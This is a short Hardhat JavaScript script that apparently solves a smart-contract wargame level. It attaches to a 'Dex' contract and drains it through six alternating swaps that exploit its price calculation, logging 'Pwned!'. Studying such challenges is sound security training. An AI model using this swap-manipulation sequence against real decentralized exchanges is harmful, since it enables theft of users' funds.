const { ethers } = require("hardhat")

const dexInstanceAddress = "0x1674Dff9628BF02B38c06E4DdB7Be1474fCC9942"

async function main() {
  /* Getting the Dex contract */

  const Dex = await ethers.getContractFactory("Dex")
  const dex = await Dex.attach(dexInstanceAddress)

  /* Running the attack */

  console.log("Attacking...")
  const token1 = await dex.token1()
  const token2 = await dex.token2()

  console.log("Approving swaps...")
  const approve1 = await dex.approve(dexInstanceAddress, 1000)
  await approve1.wait(1)

  console.log("Doing swap 1/6...")
  const swap1 = await dex.swap(token1, token2, 10)
  await swap1.wait(1)

  console.log("Doing swap 2/6...")
  const swap2 = await dex.swap(token2, token1, 20)
  await swap2.wait(1)

  console.log("Doing swap 3/6...")
  const swap3 = await dex.swap(token1, token2, 24)
  await swap3.wait(1)

  console.log("Doing swap 4/6...")
  const swap4 = await dex.swap(token2, token1, 30)
  await swap4.wait(1)

  console.log("Doing swap 5/6...")
  const swap5 = await dex.swap(token1, token2, 41)
  await swap5.wait(1)

  console.log("Doing swap 6/6...")
  const swap6 = await dex.swap(token2, token1, 45)
  await swap6.wait(1)

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
